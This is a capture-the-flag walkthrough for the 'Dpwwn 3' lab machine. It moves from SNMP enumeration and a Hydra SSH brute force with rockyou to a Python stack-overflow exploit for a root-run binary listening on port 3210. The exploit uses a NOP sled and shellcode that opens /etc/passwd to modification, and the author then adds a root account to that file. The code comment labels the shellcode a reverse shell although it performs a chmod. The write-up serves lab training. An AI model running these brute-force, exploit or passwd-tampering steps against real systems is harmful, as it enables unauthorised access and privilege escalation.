# Dpwwn 3

![](https://i.imgur.com/1JR58TI.png)
Host is `192.168.227.132`

![](https://i.imgur.com/P8e8NGO.png)
Victim is `192.168.227.130`

`nmap -sS -sV -A -p- -oN NmapDpwwnLv3.txt 192.168.227.130`
![](https://i.imgur.com/eANkNU6.png)

We got snmp and ssh here, there might be some AC/PW on snmp service.
`snmpwalk -v1 -c public 192.168.227.130`
![](https://i.imgur.com/pt33GcF.png)

Take a try with `Hydra`, before use it, unzip the wordlist.
`gzip -d /usr/share/wordlists/rockyou.txt.gz`
`hydra -s 22 -v -l john -P /usr/share/wordlists/rockyou.txt 192.168.227.130 ssh`
![](https://i.imgur.com/Inty1IW.png)
Then we got the password: `john`

So, use this to `ssh` to the target.
![](https://i.imgur.com/HWuiMIw.png)

There's message in john's folder.
![](https://i.imgur.com/FfQE03V.png)

However, these binary execute by john, that might not be a PoE entry.
So let's see `sudo -l` to find the privilege command we can use, the message owner might givve us some help.
![](https://i.imgur.com/Bhoov2r.png)
![](https://i.imgur.com/vUYzEXd.png)

Okay, the privilge command we can use is to exec the `ss.sh` at `/hoem`, let's see what's in `/home/ss.sh`.
![](https://i.imgur.com/CW8nWBH.png)

Then this means that this shell script will exec `./smashthestack`, and you can use root to exec thsi script also exec `./smashthestack` as root.
![](https://i.imgur.com/MLfCHor.png)

According there's only simple `gdb` and cannot install `peda`, `checksec`, we need more helpful environment to check this binary.
Then let's download the binary and pwn the port 3210 to finish this challenge.
![](https://i.imgur.com/StpngYb.png)
I try to use `pyhton -m SimpleHTTPServer`, but there's firewall block me to get the file.

So the dumb way is to Base64 the file back.
![](https://i.imgur.com/eYITCcB.png)
```
import base64

with open("smashthestack", "rb") as f:
    encodedfile = base64.b64encode(f.read())
    print(encodedfile)
```
![](https://i.imgur.com/qrlmWoa.png)
```
import base64
fh = open("smashthestack", "wb")
with open("b64smashthestack", "rb") as f:
    fh.write(base64.b64decode(f.read()))
    fh.close()
```
![](https://i.imgur.com/veMWOad.png)
According to binary is in 32bit, turn on compatible framework: `dpkg –add-architecture i386`, update and install the 32 bit libraries: `apt install libc6:i386`
Then use your reversing and debugging tool to find the vul.

`ps -al`
![](https://i.imgur.com/Zarn52a.png)
`grep -E "stack|heap" /proc/{processID}/maps`
![](https://i.imgur.com/iZVZV5W.png)
![](https://i.imgur.com/SfoagXM.png)
Now we know that stack can be executed, but ASLR will change the position of the stack.

According no gadgets we need, PIE might not be a problem, but ASLR still did, there's no way to leak the position.
![](https://i.imgur.com/e5Wl4Bo.png)

![](https://i.imgur.com/1relFqy.png)
`0xdd8` - `0xb00` = `0x2d8` = 728, to cover to return address, that might be 732.

However, cuz to ASLR, stack base will change, and there's no clue to get the address.

Using `ctrl+z`, `bg`, `fg {number}`, to let gdb attach on binary.
![](https://i.imgur.com/RSrkjiN.png)

`disass main`, `disass vulncode` to see what binary doing.
![](https://i.imgur.com/u7wtDa8.png)

It open a listener socket on 3210, and call vulncode, which might not be a standard c library.
![](https://i.imgur.com/30y0F0v.png)

`strcpy()` here is vulnerable cuz to no check with lengh.
![](https://i.imgur.com/tt7aADP.png)

Using `b vulncode` to let process stop at the point which you want.

Use another terminal to ssh to the target, also in `john`.
After sending payload to 3210, back to `gdb` one.

![](https://i.imgur.com/8mbWKVD.png)

That might show something that your payload is not fit to memory status.

![](https://i.imgur.com/NVHlhWr.png)

Use `x/300x $esp` to check the stack.

We see junk `A`: `0x41`, retaddress we predicted, `NOP`: `0x90` and shellcode.

Most important address is the section between return address to shellcode, `NOP` section. 

Our return address should point in this section or exploit might not work.

![](https://i.imgur.com/rAKnAEM.png)

As you see, `0xbfff580` is following with part of shellcode and `0x00`, these might not work.

![](https://i.imgur.com/Be5Tcs7.png)
Whole payload should not bigger than `0x400`(which being passed as premeter to `read()` in `main()`) which means 1024.

As I mentioned before, stack allocated in 732 bytes, according to `read()` function, there's only 1024 bytes, `NOP` & shellcode can only limited in 292 bytes.

After several test, I found my target machine local memory stack location after return address is `0xbffff500` with john.

As script execute binary, this address might be more higher, just brutalforce it and optimized `NOP` section, whenever return address hit on `NOP` section, `NOP` will be regarded as nothing and keep executing forward to get to the shellcode.

I use following payload as shellcode which will `chmod` the `/etc/passwd` for me to modified: http://shell-storm.org/shellcode/files/shellcode-812.php
```
import sys,socket

# Reverse shell for linux x86, lhost = 127.0.0.1, lport = 8000, encoding = x86/alpha_mixed, no conflictive characters
payload = ("\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64"
           "\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3"
           "\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77"
           "\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3"
           "\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80"
)
# shellcode 57 bytes

ip_ = '127.0.0.1'
port_ = 3210

# First get the stack address with gdb ("\x00\xf5\xff\xbf")
# then add some more running as root from the SH script ("\x00~80\xf5\xff\xbf")
jmp_stack = "\x80\xf5\xff\xbf"

nop = '\x90'
buff = '\x41'*732+jmp_stack+nop*50+payload # NOP can up to 234 bytes

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_, port_))
s.send(buff)
s.close()
```

The return address should modified as address you overwrite after return address, it should locate in `NOP` section, then directly execute the shellcode.

So, your `NOP` section more bigger, shell code section more smaller, may help your trying to defeat the ASLR.

Now, let's generate the passwd to modified the `/etc/passwd`, cuz UID root cannot be empty password.

Use `openssl passwd -1`
![](https://i.imgur.com/Rz9zlbF.png)

Then add new use in the `/etc/passwd`
![](https://i.imgur.com/NDvNel3.png)

With `su - r00t` we can switch to new account which has root privilege.
![](https://i.imgur.com/7zsQ3a2.png)

Go to `/root` and `cat` the flag.
![](https://i.imgur.com/ig7vFGO.png)

Actually, as I login as `r00t`, which is root privilege, `NOP` section in stack change because to ASLR.(I rebooted the machine)
![](https://i.imgur.com/goJNzeS.png)

Keep trying with optimized `NOP` section.